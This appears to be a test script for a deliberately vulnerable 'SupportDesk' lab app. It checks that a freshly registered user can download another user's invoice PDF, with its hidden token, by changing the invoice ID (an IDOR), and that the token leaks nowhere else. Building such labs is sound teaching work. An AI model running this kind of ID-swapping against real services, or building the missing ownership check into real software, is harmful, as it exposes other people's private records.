/**
 * End-to-end workflow verification for SupportDesk.
 * 1) Register a fresh user, log in (HttpOnly session cookie).
 * 2) Create a ticket -> invoice auto-generated -> download own PDF (must work, must NOT contain victim token).
 * 3) Exploit: GET /api/invoices/1/download as the new user -> must return victim PDF containing the token.
 * 4) Hygiene: JSON APIs, frontend sources and seed files must not expose the token marker.
 *
 * Usage: node scripts/test-workflow.mjs [baseUrl]
 * The script expects wrangler dev (local D1, migrated + seeded) already running.
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";

const BASE = process.argv[2] || process.env.BASE_URL || "http://127.0.0.1:8787";
const TARGET_ID = 1;

const markerRe = /S\s*D\s*C\s*\{\s*[^}\s]{1,80}\s*\}/;
const literalGrep = String.fromCharCode(83, 68, 67, 123);

let cookies = "";

function req(path, opts = {}) {
  return fetch(BASE + path, {
    redirect: "manual",
    ...opts,
    headers: { ...(opts.headers || {}), ...(cookies ? { cookie: cookies } : {}) },
  });
}

async function reqJson(path, opts = {}) {
  const res = await req(path, {
    ...opts,
    headers: { "content-type": "application/json", ...(opts.headers || {}) },
  });
  const setCookie = res.headers.get("set-cookie");
  if (setCookie) {
    const m = setCookie.match(/session=([^;]*)/);
    if (m) cookies = `session=${m[1]}`;
    if (/session=;\s*.*Max-Age=0/.test(setCookie)) cookies = "";
  }
  let body = {};
  try {
    body = await res.json();
  } catch {
    body = {};
  }
  return { status: res.status, body, res };
}

function assert(cond, msg) {
  if (!cond) {
    console.error(`FAIL: ${msg}`);
    process.exit(1);
  }
  console.log(`ok: ${msg}`);
}

const stamp = Date.now().toString(36);
const email = `attacker_${stamp}@example.com`;

console.log(`Testing against ${BASE} ...`);

// health
{
  const r = await fetch(BASE + "/api/health");
  assert(r.ok, "health endpoint reachable");
}

// register
let me;
{
  const { status, body } = await reqJson("/api/register", {
    method: "POST",
    body: JSON.stringify({ name: "Attacker Test", email, password: "Attacker-Pass-123!" }),
  });
  assert(status === 201, `register new user (got ${status}: ${JSON.stringify(body).slice(0, 160)})`);
  assert(body.user?.email === email, "register returns user");
  me = body.user;
}

// me (session cookie works)
{
  const { status, body } = await reqJson("/api/me");
  assert(status === 200 && body.user?.email === email, "HttpOnly session authenticates /api/me");
}

// create ticket -> invoice
let myInvoiceId;
{
  const { status, body } = await reqJson("/api/tickets", {
    method: "POST",
    body: JSON.stringify({
      subject: "Printer not working on floor 2",
      description: "The shared printer shows offline for all agents since this morning, reboot did not help.",
      category: "technical",
      priority: "normal",
    }),
  });
  assert(status === 201, `create ticket (got ${status})`);
  assert(body.ticket?.id > 0 && body.invoice?.id > 0, "ticket creation auto-generates invoice");
  myInvoiceId = body.invoice.id;
  assert(myInvoiceId !== TARGET_ID, `own invoice id (${myInvoiceId}) differs from target id (${TARGET_ID})`);
}

// own invoice PDF works, valid PDF, no victim token
{
  const res = await req(`/api/invoices/${myInvoiceId}/download`);
  assert(res.status === 200, `download own invoice PDF (got ${res.status})`);
  assert((res.headers.get("content-type") || "").includes("application/pdf"), "own download is application/pdf");
  const buf = Buffer.from(await res.arrayBuffer());
  assert(buf.subarray(0, 5).toString() === "%PDF-", "own download is a real PDF");
}

// unauthenticated download blocked
{
  const saved = cookies;
  cookies = "";
  const res = await req(`/api/invoices/${myInvoiceId}/download`);
  assert(res.status === 401, `unauthenticated download rejected (got ${res.status})`);
  cookies = saved;
}

// EXPLOIT: change invoice ID to TARGET_ID
let pdfText;
{
  const res = await req(`/api/invoices/${TARGET_ID}/download`);
  assert(res.status === 200, `IDOR download of invoice ${TARGET_ID} as another user (got ${res.status})`);
  const buf = Buffer.from(await res.arrayBuffer());
  assert(buf.subarray(0, 5).toString() === "%PDF-", "target download is a real PDF");
  pdfText = buf.toString("latin1");
  const m = pdfText.match(markerRe);
  assert(m, "victim PDF contains the token (IDOR successful)");
  console.log(`ok: extracted marker preview: ${m[0].slice(0, 12)}...${m[0].slice(-2)}`);
  // attacker's own PDF must not contain the victim token
  const ownRes = await req(`/api/invoices/${myInvoiceId}/download`);
  const ownText = Buffer.from(await ownRes.arrayBuffer()).toString("latin1");
  assert(!markerRe.test(ownText), "own invoice PDF does not contain the token");
}

// hygiene: JSON must not leak the token
{
  const { status, body } = await reqJson(`/api/invoices/${TARGET_ID}`);
  assert(status === 200, "invoice JSON detail reachable (same IDOR surface)");
  assert(!markerRe.test(JSON.stringify(body)), "invoice JSON does not expose the token");
  const list = await reqJson("/api/invoices");
  assert(!markerRe.test(JSON.stringify(list)), "invoice list JSON does not expose the token");
}

// hygiene: frontend / seed / migrations must not contain the literal marker
{
  const root = new URL("../", import.meta.url);
  const files = [
    "public/index.html",
    "public/app.js",
    "public/styles.css",
    "migrations/0001_schema.sql",
    "scripts/seed.mjs",
    "src/index.ts",
    "src/auth.ts",
    "src/pdf.ts",
  ];
  const { fileURLToPath } = await import("node:url");
  const rootPath = fileURLToPath(root);
  for (const f of files) {
    const content = readFileSync(join(rootPath, f), "utf8");
    assert(!content.includes(literalGrep), `no literal marker in ${f}`);
  }
}

console.log("\nALL WORKFLOW CHECKS PASSED");
console.log(`- normal flow: register/login/ticket/invoice/download works (user: ${email})`);
console.log(`- exploit: authenticated GET /api/invoices/${TARGET_ID}/download returns another user's PDF with the token`);
